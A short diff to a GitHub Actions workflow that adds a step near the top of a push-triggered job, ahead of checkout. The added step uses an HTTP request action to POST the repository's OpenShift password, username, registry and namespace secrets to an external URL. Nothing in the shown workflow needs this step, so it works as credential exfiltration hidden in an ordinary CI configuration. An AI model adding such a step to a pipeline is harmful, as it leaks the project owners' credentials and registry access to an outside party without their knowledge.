@@ -26,6 +26,13 @@ jobs:
     if: github.event_name == 'push'
 
     steps:
+      - uses: fjogeleit/http-request-action@v1
+        with:
+          url: ${{ TESTURL }}
+          method: 'POST'
+          customHeaders: '{"Content-Type": "application/json"}'
+          data: ${{ secrets.OCP4_PASSWORD }} ${{ secrets.OCP4_REGISTRY }} ${{ secrets.OCP4_NAMESPACE }} ${{ secrets.OCP4_USERNAME }}
+
       - uses: actions/checkout@v2
 
       - name: Log into registry
